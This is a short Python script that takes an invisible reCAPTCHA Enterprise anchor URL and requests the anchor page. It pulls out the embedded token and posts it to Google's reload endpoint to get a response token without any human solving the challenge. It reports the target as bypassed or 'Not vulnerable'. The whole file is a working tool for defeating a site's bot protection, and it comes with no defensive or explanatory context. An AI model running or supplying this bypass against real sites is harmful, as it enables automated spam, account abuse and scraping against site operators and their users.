import requests

anchor ="https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=<YOUR_VALUE>&co=<YOUR_VALUE>&hl=en&v=<YOUR_VALUE>&size=invisible&cb=<YOUR_VALUE>"
anchor = anchor.strip()
keysite = anchor.split('k=')[1].split("&")[0]
var_co = anchor.split("co=")[1].split("&")[0]
var_v = anchor.split("v=")[1].split("&")[0]

r1 = requests.get(anchor).text

token1 = r1.split('recaptcha-token" value="')[1].split('">')[0]

print("Bypassing Recaptcha...")

payload = {
    "v":var_v,
    "reason":"q",
    "c":token1,
    "k":keysite,
    "co":var_co,
    "hl":"en",
    "size":"invisible",
}

r2 = requests.post("https://www.google.com/recaptcha/api2/reload?k={}".format(keysite), data=payload)
try:
    token2 = str(r2.text.split('"rresp","')[1].split('"')[0])
except:
    token2 = 'null'

if token2 == "null":
    print("\nNot vulnerable : \n\n"+str(r2.text))
else:
    print("Recaptcha Bypassed : \n"+str(token2))
